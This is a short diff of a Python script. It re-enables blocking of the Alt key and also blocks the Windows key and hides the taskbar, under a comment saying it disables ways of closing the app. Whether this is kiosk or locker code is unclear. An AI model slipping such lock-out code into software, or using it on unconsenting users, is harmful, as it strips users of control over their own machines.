@@ -25,7 +25,7 @@ if __name__ == "__main__":
 
     # Disable ways of closing the app
     print("Running....")
-    # k.block_key("alt")
+    k.block_key("alt")
     k.block_key("windows")
     h = windll.user32.FindWindowA(b"Shell_TrayWnd", None)
     windll.user32.ShowWindow(h, 0)
